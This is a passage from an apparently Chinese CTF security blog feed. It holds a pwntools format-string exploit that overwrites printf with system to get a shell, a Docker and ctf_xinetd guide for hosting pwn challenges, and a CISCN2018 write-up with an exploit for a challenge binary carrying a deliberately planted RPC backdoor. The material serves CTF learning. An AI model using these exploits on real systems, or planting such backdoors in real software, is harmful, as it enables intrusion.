punctuation">(</span><span class="token string">'libc.so'</span><span class="token punctuation">)</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">'%6$x'</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>p_ebp2 <span class="token operator">=</span> int<span class="token punctuation">(</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#10</span>p_7 <span class="token operator">=</span> p_ebp2<span class="token number">-0xc</span><span class="token comment" spellcheck="true">#7</span>p_11 <span class="token operator">=</span> p_ebp2<span class="token operator">+</span><span class="token number">4</span><span class="token comment" spellcheck="true">#11</span>p_ebp1 <span class="token operator">=</span> p_ebp2<span class="token number">-0x10</span><span class="token comment" spellcheck="true">#6</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_7<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%6$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_ebp2->p_7</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_printf<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%10$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_7->p_printf</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_11<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%6$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_ebp2->p_11</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>p_printf<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%10$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_11->p_printf+2</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'here\x00'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>pay <span class="token operator">=</span> <span class="token string">"aaaa%7$s\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>printf <span class="token operator">=</span> u32<span class="token punctuation">(</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>printf<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leak printf</span>system <span class="token operator">=</span> printf<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>system<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%7$hn"</span> pay <span class="token operator">+=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>system<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>system<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%11$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#hijack printf->system</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>有点懵，好好消化。</p><p>原来各处的&amp;ffff，不单单是为了匹配后面的%$hn解引用写两个字节，而是，这种写的方式并不是覆盖，而是将所指定的内存空间的前两个字节换成我们要写的值。</p><p>如<code>&quot;%&quot;+str(p_11&amp;0xffff)+&quot;c%6$hn\x00&quot;</code>，则表示将向栈空间偏移量6的位置的前两个字节写成<code>p_11&amp;0xffff</code>，即原数据若为<code>0x12345678</code>，经过操作后变为了<code>0x12340000+p_11&amp;0xffff</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-十月31-Hitcon-五&quot;&gt;&lt;a href=&quot;#Pwn-十月31-Hitcon-五&quot; class=&quot;headerlink&quot; title=&quot;Pwn-十月31-Hitcon-五&quot;&gt;&lt;/a&gt;Pwn-十月31-Hitcon-五&lt;/h1&gt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>使用Docker进行Pwn题环境部署</title>
    <link href="http://www.yof3ng.xyz/2018/10/30/Pwn%E9%A2%98%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    <id>http://www.yof3ng.xyz/2018/10/30/Pwn题环境部署/</id>
    <published>2018-10-30T15:15:43.000Z</published>
    <updated>2018-10-30T16:11:17.499Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="使用Docker进行Pwn题环境部署"><a href="#使用Docker进行Pwn题环境部署" class="headerlink" title="使用Docker进行Pwn题环境部署"></a>使用Docker进行Pwn题环境部署</h1><blockquote><p>😄docker是个好东西，在CTF比赛中我们可以经常遇到通过docker部署的web，或者Pwn环境，同样我们也可以将一些服务部署在docker里面，管理方便，并且较为安全。</p><p>通过docker我们可以自己创建镜像，或者拉取镜像，比如说<a href="http://vulapps.evalbug.com/" target="_blank" rel="noopener">vulapps</a>上面的靶机，还有这次要讲的简单的Pwn环境部署框架。</p><p>这里有Angel_kitty师傅写的一份超详细docker教程。<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9789130.html" target="_blank" rel="noopener">传送门</a></p></blockquote><h2 id="Docker-安装"><a href="#Docker-安装" class="headerlink" title="Docker 安装"></a>Docker 安装</h2><h3 id="1-apt安装"><a href="#1-apt安装" class="headerlink" title="1.apt安装"></a>1.apt安装</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> docker docker-compose</code></pre><h3 id="2-手动下载并且安装"><a href="#2-手动下载并且安装" class="headerlink" title="2.手动下载并且安装"></a>2.手动下载并且安装</h3><p><a href="https://download.docker.com/linux/debian/dists/" target="_blank" rel="noopener">下载链接</a></p><p>下载完成后进入安装报所在的目录，并且执行一下命令进行安装：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#dbkg -i filename</span>dpkg -i docker-ce_17.03.1~ce-0~debian-jessie_amd64.deb</code></pre><h3 id="3-切换镜像源"><a href="#3-切换镜像源" class="headerlink" title="3.切换镜像源"></a>3.切换镜像源</h3><p>vim /etc/docker/daemon.json</p><pre class=" language-shell"><code class="language-shell">cat > /etc/docker/daemon.json << EOF{  "registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"]}EOFservice docker restart</code></pre><h2 id="Docker-简单使用"><a href="#Docker-简单使用" class="headerlink" title="Docker 简单使用"></a>Docker 简单使用</h2><p>我们可以通过以下几条命令简单测试一下docker是否安装成功：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#启动docker</span><span class="token function">service</span> docker startdocker images<span class="token comment" spellcheck="true">#hello-world为其自带的一个image</span>docker run hello-world</code></pre><p>以及一些常用的命令，可以记录一下：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#查看本地已有镜像</span>docker images<span class="token comment" spellcheck="true">#运行镜像并进入</span>docker run -i -t httpd /bin/bash<span class="token comment" spellcheck="true">#后台运行镜像，镜像8080端口映射到主机80端口</span>docker run -d -p 80:8080 httpd<span class="token comment" spellcheck="true">#进入已有容器</span>docker <span class="token function">exec</span> -it <span class="token punctuation">[</span>container-id<span class="token punctuation">]</span> /bin/bash<span class="token comment" spellcheck="true">#关闭镜像</span>docker stop httpd<span class="token comment" spellcheck="true">#查看当前正在运行的镜像</span>docker <span class="token function">ps</span>　　　　　　　　　　　　　　　　</code></pre><h1 id="Pwn部署框架"><a href="#Pwn部署框架" class="headerlink" title="Pwn部署框架"></a>Pwn部署框架</h1><blockquote><p>通过框架我们可以快速地部署Pwn题环境，而不用操太多的心💗。</p></blockquote><h2 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf_xinetd"></a>ctf_xinetd</h2><p>我们可以从github上下载到<a href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener">ctf_xinetd</a> ，它是开源的一个项目。</p><blockquote><p>#README.md</p><blockquote><p>A docker repository for deploying CTF challenges</p></blockquote><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><p>Put files to floder <code>bin</code>. They’ll be copied to /home/ctf. <strong>Update the flag</strong> at the same time.</p><p>Edit <code>ctf.xinetd</code>. replace <code>./helloworld</code> to your command.</p><p>You can also edit <code>Dockerfile, ctf.xinetd, start.sh</code> to custom your environment.</p><h2 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h2><pre class=" language-bash"><code class="language-bash">docker build -t <span class="token string">"helloworld"</span> <span class="token keyword">.</span></code></pre><p>DO NOT use <em>bin</em> as challenge’s name</p><h2 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h2><pre class=" language-bash"><code class="language-bash">docker run -d -p <span class="token string">"0.0.0.0:pub_port:9999"</span> -h <span class="token string">"helloworld"</span> --name<span class="token operator">=</span><span class="token string">"helloworld"</span> helloworld</code></pre><p><code>pub_port</code> is the port you want to expose to the public network.</p><h2 id="Capture-traffic"><a href="#Capture-traffic" class="headerlink" title="Capture traffic"></a>Capture traffic</h2><p>If you want to capture challenge traffic, just run <code>tcpdump</code> on the host. Here is an example.</p><pre class=" language-bash"><code class="language-bash">tcpdump -w helloworld.pcap -i eth0 port pub_port</code></pre></blockquote><p>先简单地看一下它的目录结构：</p><p><img src="https://i.loli.net/2018/10/30/5bd87b591ea60.png" alt=""></p><p>首先将项目下载到本地，并且将准备好的pwn题和flag放入bin文件夹中。<br><img src="https://i.loli.net/2018/10/30/5bd87ba1360b7.png" alt=""></p><p>然后我们去修改ctf.xinetd文件中的配置参数：</p><p><img src="https://i.loli.net/2018/10/30/5bd87bda03b20.png" alt=""></p><p>然后根据readme文档我们可以进行docker容器的建立，运行，乃至流量的监听。</p><h1 id="国赛Pwn之一"><a href="#国赛Pwn之一" class="headerlink" title="国赛Pwn之一"></a>国赛Pwn之一</h1><blockquote><p>还记得今年国赛是让各支进了半决赛的队伍进行出题，靶标设置，这个环节被称作<code>Built it</code>，但是我们太菜了，没有出题，也没有参加的那个实力，PS:我会说我连<a href="https://github.com/sherlly/ciscn2018-pwn/tree/master/checker" target="_blank" rel="noopener">checker</a>都没看懂吗，更别说过checker了。</p><p>附上Xp0int队伍国赛出的题解，以及Pwn环境，借以参考。</p></blockquote><blockquote><p>#WP</p><h2 id="CISCN2018-May-be-a-calculator"><a href="#CISCN2018-May-be-a-calculator" class="headerlink" title="CISCN2018 : May be a calculator?"></a>CISCN2018 : May be a calculator?</h2><h2 id="Principle"><a href="#Principle" class="headerlink" title="[Principle]"></a><strong>[Principle]</strong></h2><p>backdoor</p><h2 id="Environment"><a href="#Environment" class="headerlink" title="[Environment]"></a><strong>[Environment]</strong></h2><p>Ubuntu</p><h2 id="Tools"><a href="#Tools" class="headerlink" title="[Tools]"></a><strong>[Tools]</strong></h2><p>gdb、objdump、python、pwntools</p><h2 id="Process"><a href="#Process" class="headerlink" title="[Process]"></a><strong>[Process]</strong></h2><p>考察RPC相关协议及预留后门，通过逆向代码逻辑可以看到在符合type为0x6时，隐藏了一个后门，在后门函数中首先对接收到的key进行检查，通过将加密后的key（加密算法为简单的异或）和一个固定字符串进行比较，相等则接收真正的payload，加密算法如下：</p><pre><code>void encrypt(char* key){  int i;  int k=0;  for(i=0;i&lt;36;i++)  {    key[i]=(key[i]^k)%256;    k+=23;  }}</code></pre><p>最终脚本如下：<br>exp.py</p><pre><code>from pwn import *import ospayload=&quot;cat flag&quot;key=&quot;12345678-6666-2333-5555-deadbeef1234&quot;backdoor=b&#39;RPCM\x00\x00\x00\x0c\x00\x00\x00\x06&#39;+p32(len(key))[::-1]+key+p32(len(payload))[::-1]+payloadr = remote(&#39;127.0.0.1&#39;, 1337)r.sendline(backdoor)print r.recvline()r.close()</code></pre></blockquote><p>calc.c程序代码如下：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netdb.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;uuid/uuid.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/shm.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;map></span></span><span class="token macro property">#<span class="token directive keyword">define</span> BUF_SIZE 0x100</span><span class="token macro property">#<span class="token directive keyword">define</span> LENGTH 100</span>using namespace std<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> byte<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> top<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pool<span class="token punctuation">[</span>LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> stack<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> Data<span class="token punctuation">{</span>  string corr_id<span class="token punctuation">;</span>  string res<span class="token punctuation">;</span><span class="token punctuation">}</span> Data<span class="token punctuation">;</span><span class="token keyword">typedef</span> queue<span class="token operator">&lt;</span>Data<span class="token operator">></span> Q<span class="token punctuation">;</span><span class="token keyword">typedef</span> map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span> MQ<span class="token punctuation">;</span>map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>iterator it_find<span class="token punctuation">;</span>byte RECV_MAGIC<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> EVIL_INS<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"1%\x1dqiE\xbd\x99\x95\xf9\xd0\xcb\"\x06pjC\xb4\xb3\x80\xf9\xd6\xcf&lt;LZ7\t\xe6\xfe\xd7\xaf\xd1\xc5=\x11"</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">p32</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> result<span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span>value <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">StrTrim</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> pStr<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pTmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>pTmp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mark <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pTmp<span class="token punctuation">[</span>mark<span class="token punctuation">]</span> <span class="token operator">=</span> pStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            mark<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    pTmp<span class="token punctuation">[</span>mark<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> pTmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">myatoi</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>        sum <span class="token operator">=</span> sum <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf <span class="token operator">-</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        buf<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">read_str</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> t <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>t <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        buf<span class="token punctuation">[</span>t <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    buf<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> t<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">input_pass</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'/'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\x00'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token number">-1</span><span class="token punctuation">;</span> i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c1 <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> c2 <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c1 <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'-'</span> 